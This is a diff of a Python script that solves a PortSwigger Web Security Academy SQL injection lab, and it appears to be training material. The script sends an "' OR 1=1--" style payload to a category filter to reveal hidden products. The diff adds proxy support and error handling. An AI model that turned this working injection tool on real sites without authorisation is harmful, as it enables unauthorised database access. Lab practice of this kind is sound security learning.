@@ -3,16 +3,18 @@
 # Description: https://portswigger.net/web-security/sql-injection
 # Lab: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 # The results in the SQL query: SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
-# Example: python3 sqli_lab_01.py https://ac621f871f2eb0c6c0fb178700be008e.web-security-academy.net "' OR 1=1--"
+# Example 1 (without proxy intercept): python3 sqli_lab_01.py https://ac621f871f2eb0c6c0fb178700be008e.web-security-academy.net "' OR 1=1--"
+# Example 2 (without proxy intercept): python3 sqli_lab_01.py https://ac621f871f2eb0c6c0fb178700be008e.web-security-academy.net "' OR 1=1--" --proxy "http://127.0.0.1:8080"
 
 import requests
 import sys
 import urllib3
+import argparse
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-class Interface ():
-    def __init__ (self):
+class Interface():
+    def __init__(self):
         self.red = '\033[91m'
         self.green = '\033[92m'
         self.white = '\033[37m'
@@ -24,16 +26,16 @@ class Interface ():
         print('\n    >> SQL injection vulnerability in WHERE clause allowing retrieval of hidden data')
         print('    >> by Port Swigger Academy\n')
 
-    def info (self, message):
+    def info(self, message):
         print(f"[{self.white}*{self.end}] {message}")
 
-    def warning (self, message):
+    def warning(self, message):
         print(f"[{self.yellow}!{self.end}] {message}")
 
-    def error (self, message):
+    def error(self, message):
         print(f"[{self.red}x{self.end}] {message}")
 
-    def success (self, message):
+    def success(self, message):
         print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")
 
 # Instantiate our interface class
@@ -41,25 +43,35 @@ global output
 output = Interface()
 output.header()
 
-proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"} #proxies
-
-def exploit_sqli(url, payload):
+def exploit_sqli(url, payload, proxies=None):
     uri = "/filter?category="
-    r = requests.get(url+uri+payload, verify=False,proxies=proxies)
-    if "Robot Home Security Buddy" in r.text:
-        return True
-    else:
+    try:
+        r = requests.get(url+uri+payload, verify=False, proxies=proxies)
+        if "Cheshire Cat Grin" in r.text:
+            return True
+        else:
+            return False
+    except requests.exceptions.RequestException as e:
+        output.error(f"Request failed: {e}")
         return False
 
 if __name__ == "__main__":
-    try:
-        url = sys.argv[1].strip()
-        payload = sys.argv[2].strip()
-    except IndexError:
-        output.info("Usage: %s <url> <payload>" % sys.argv[0])
-        output.info('Example: %s www.example.com "1=1"' % sys.argv[0])
-        sys.exit(-1)
-    if exploit_sqli(url, payload):
-        output.success("SQL Injection successful!")
+    parser = argparse.ArgumentParser(description="SQL Injection exploitation tool")
+    parser.add_argument("url", help="Target URL (e.g., https://example.com)")
+    parser.add_argument("payload", help="SQL Injection payload (e.g., ' OR 1=1 --")
+    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)
+
+    args = parser.parse_args()
+
+    proxies = None
+    if args.proxy:
+        proxies = {
+            "http": args.proxy,
+            "https": args.proxy
+        }
+        output.info(f"Using proxy: {args.proxy}")
+
+    if exploit_sqli(args.url.strip(), args.payload.strip(), proxies):
+        output.success("SQL Injection Successful!")
     else:
         output.error("SQL Injection unsuccessful!")
